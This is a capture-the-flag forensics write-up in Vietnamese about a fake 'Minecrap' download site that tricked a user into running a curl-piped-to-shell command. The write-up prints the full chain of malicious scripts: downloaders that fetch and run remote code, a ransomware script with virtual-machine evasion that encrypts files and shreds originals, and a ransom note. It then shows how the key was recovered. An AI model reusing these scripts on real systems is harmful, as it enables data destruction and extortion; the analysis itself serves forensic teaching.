## Forensics - Free Mincecrap

Link problem: [Here](https://drive.google.com/drive/folders/1jKuvDrzLHvQ_wgcKewByXHO6Aas1OkTy)

Description: 

```bash
Challenge name: Free Minecrap
Author: devobass
Description: Tôi muốn chơi Minecrap nhưng nhà tôi quá nghèo, nghe bảo trên mạng có cách tải Minecrap mà chả tốn đồng nào, chắc dùng thử sẽ không có vấn đề gì đâu nhỉ?
```
Bài này cho chúng ta một disk image file, chúng ta cần dùng các tool `autopsy` hay `FTK imager` để phân tích nó.

<img width="1457" height="658" alt="image" src="https://github.com/user-attachments/assets/8398fa24-3f07-4a4e-9427-576deeb0c5f1" />

Tại `ransom_note_cool_user.txt`: 

```bash 
Ваши файлы зашифрованы, для расшифровки отправьте $36000 на 12345678910 TCB
```

`cool_user` có vẻ như đã tải game Minecrap từ trang web lạ, dẫn đến các file của anh ấy đã bị mã hóa với đuôi `.naoyacrypted`, đây là một hình thức ransomware tống tiền, yêu cầu user trả tiền để chuộc lại dữ liệu đã bị mã hóa.

Mục tiêu của chúng ta có thể là giải mã thông điệp (đã bị mã hóa) 

<img width="594" height="207" alt="image" src="https://github.com/user-attachments/assets/dd4b7452-89a7-4fed-a881-aa393c190098" />

Ta cần biết trang web đã lừa `cool-user` như thế nào. 
Muốn biết trang web nào mà user đã truy cập, ta cần truy cập vào lịch sử duyệt web được lưu tại `places.sqlite` (một file chứa lịch sử duyệt web của Firefox) : 

<img width="905" height="529" alt="image" src="https://github.com/user-attachments/assets/b1b83f1b-97b9-4cf3-976b-aecbacadf2b8" />
<img width="1075" height="584" alt="image" src="https://github.com/user-attachments/assets/63e0516a-9600-4536-af92-5996bc4f2f6d" />

Truy cập trang web nơi user đến để download game `https://evil-guy-on-the-internet.codeberg.page`
<img width="1389" height="977" alt="image" src="https://github.com/user-attachments/assets/675285f8-018d-4952-9ff0-6b23d13f5d8c" />

Như chúng ta thấy, trang web yêu cầu user nhập lệnh sau vào shell, lệnh này sẽ tự động thực thi qua shell để tiếp tay cho việc tống tiền.

```bash
$ curl -s "https://codeberg.org/evil-guy-on-the-internet/pages/raw/branch/main/file/download-minecrap.sh" | sh`
```
Dùng lệnh sau để xem `download-minecrap.sh` làm gì:
```bash
$ curl -s "https://codeberg.org/evil-guy-on-the-internet/pages/raw/branch/main/file/download-minecrap.sh" | cat
```
Output: 
```bash
#!/usr/bin/env sh

printf "Hang tight while were downloading minecrap for you!\n"
curl -s "https://codeberg.org/evil-guy-on-the-internet/pages/raw/branch/main/file/downloader.sh" --output "/tmp/downloader.sh"
chmod 777 "/tmp/downloader.sh"
ln -s "/tmp/downloader.sh" "$HOME/minecrap"
sleep 2
printf "done!\n"
```

File Bash tiếp tục tự download `downloader.sh` về máy user, cùng với `symbol link` `$HOME/minecrap` trỏ đến `downloader.sh`. Khi user tưởng đó là file exe để thiết lập game, chúng đã lợi dụng user click vào để thực thi `downloader.sh` mà user không hay biết.

Lưu trữ file trong thư mục tạm thời `/tmp` của Linux sử dụng RAM để lưu trữ, nên khi tắt máy tính, dữ liệu sẽ bị xóa. Làm như vậy tiếp tay cho chúng có thể vừa lừa được user, vừa có thể xóa dấu vết của mình, để lại chỉ là `symlink`.

Trong `downloader.sh` có gì?
```bash
#!/usr/bin/env sh

export AES_KEY="nowsyourchancetobeabigshot"

curl -s "https://codeberg.org/evil-guy-on-the-internet/pages/raw/branch/main/file/decrypter.sh" --output "/tmp/decrypter.sh"
sh "/tmp/decrypter.sh" &

printf "Downlaoding libraries...\n"
sleep 2

printf "Downlaoding jutjutsu kaisen mod apk unlimited money...\n"
sleep 2

printf "Downlaoding shaders with no lag 2019...\n"
sleep 2

printf "Downlaoding minecrap.exe from mahjong...\n"
sleep 2

printf "404 FILE NOT FOUND\n"
sleep 1

printf "Sorry your Minecrap is not available right naow, plaese try agian later."
```
Bash trên tiếp tục tải và thực thi tự động file `decrypter.sh`
```bash
#!/usr/bin/env sh

SEED="$(printf $AES_KEY | sha256sum)"
KEY="$(printf $SEED | cut -c 1-32)"
IV="$(printf $SEED | cut -c 33-64)"

SEED_R="$(printf "$USER-$(hostname)" | sha256sum)"
export KEY_R="$(printf $SEED_R | cut -c 1-32)"
export IV_R="$(printf $SEED_R | cut -c 33-64)"

curl -s "https://codeberg.org/evil-guy-on-the-internet/pages/raw/branch/main/file/ransom.sh" | xxd -r -p | openssl enc -d -aes-128-cbc -K "$KEY" -iv "$IV" | sh > /dev/null 2>&1

printf 'Ваши файлы зашифрованы, для расшифровки отправьте $36000 на 12345678910 TCB' > "ransom_note_$USER.txt"
```
Dựa vào script trên, để biết `ransom.sh` làm gì, chúng ta cần cung cấp `KEY` và `IV`.
`KEY` và `IV`, được tính từ `AES_KEY` được gán giá trị tại `downloader.sh`.

Tiếp tục bóc tách `ransom.sh`: 
```bash
#!/usr/bin/env sh

fail() {
        echo "There is no free minecrap"
        exit
}

if grep -qE '^(flags|Features).*hypervisor' /proc/cpuinfo 2>/dev/null; then
        :
else
        # 2. DMI vendor / product name
        for f in \
                /sys/class/dmi/id/sys_vendor \
                /sys/class/dmi/id/product_name \
                /sys/class/dmi/id/board_vendor
        do
                [ -r "$f" ] || continue
                case "$(cat "$f")" in
                        *QEMU*|*KVM*|*VMware*|*VirtualBox*|*Xen*|*Microsoft*)
                                exit 0
                                ;;
                esac
        done
        fail
fi

find . -path '*/.*' -prune -o ! -name '*.naoyacrypted' -type f -print | while IFS= read -r i; do
        openssl aes-128-cbc -e -in "$i" -K "$KEY_R" -iv "$IV_R" | xxd -p > "$i.naoyacrypted"
        shred -zu "$i"
done
```

Đoạn script ransom trên lấy tất cả các file trong thư mục hiện tại của user, sau đó tạo một bản sao của mỗi file gốc, bị mã hóa bằng AES-128-CBC với đuôi `.naoyacrypted`, cùng với `KEY_R` và `IV_R` làm ổ khóa. `shred -zu "$i` để xóa vĩnh viễn và triệt để các file gốc.

> `shred -zu "$i` xóa mạnh hơn lệnh `rm $i`. Vì `rm` chỉ xóa pointer trỏ đến file, đánh dấu là EMPTY, nhưng bản chất file vẫn nằm trên ổ cứng, file recovery có thể khôi phục được. Còn `shred -zu "$i"` can thiệp trực tiếp vào vùng nhớ của file, ghi đè lặp đi lặp lại loạt ký tự rác lên đó, dẫn đến xóa sạch dấu vết của file gốc, công cụ file recovery không thể khôi phục lại được.

Vì AES là mã hóa đối xứng, mình muốn giải mã các file `.naoyacrypted` thì phải có `KEY_R` và `IV_R`, giống như chìa khóa dùng để mã hóa file (2 giá trị đó vừa đóng vai trò là một ổ khóa để mã hóa, vừa là chìa khóa để giải mã). Mà chúng ta đã có `KEY_R` và `IV_R` thông qua `decrypter.sh`. 2 giá trị đó được tính như sau (tại `decrypter.sh`):

```bash
SEED_R="$(printf "$USER-$(hostname)" | sha256sum)"
export KEY_R="$(printf $SEED_R | cut -c 1-32)"
export IV_R="$(printf $SEED_R | cut -c 33-64)"
```

Chúng ta cần mô phỏng cuộc tấn công được thực hiện trên máy user, vậy chúng ta phải tìm giá trị `$USER` cùng `$(hostname)`.Tìm ở đâu? 2 giá trị đó được lưu trữ tại `/etc/passwd` và `/etc/hostname` tại máy user

<img width="345" height="303" alt="image" src="https://github.com/user-attachments/assets/a91d4e45-9d95-422c-97f5-bcbb364e80e9" />
<img width="541" height="464" alt="Screenshot 2026-10-24 142539" src="https://github.com/user-attachments/assets/1342814c-73d4-40f3-b57c-81e6da8eb1a6" />

Thay giá trị `$USER` cùng `$(hostname)`, ta tính được `KEY_R` và `IV_R`

`KEY_R = b3ad828a83cbc86e59b164dc8589bb2f`
`IV_R = 3a94e14164680f400fe1ff381e8431e8`

Ta tiến hành giải mã `my-beautiful-drawing.png.naoyacrypted` bằng Cyberchef:

<img width="765" height="214" alt="image" src="https://github.com/user-attachments/assets/f50ccd96-062e-436d-b42e-b2cec9a24da1" />

Input tại cyberchef là Raw, KHÔNG phải Hexdump của `my-beautiful-drawing.png.naoyacrypted`

Thu được flag:
<img width="1478" height="875" alt="image" src="https://github.com/user-attachments/assets/63fa81f8-ed43-4423-8ddd-6552bc74f6c5" />









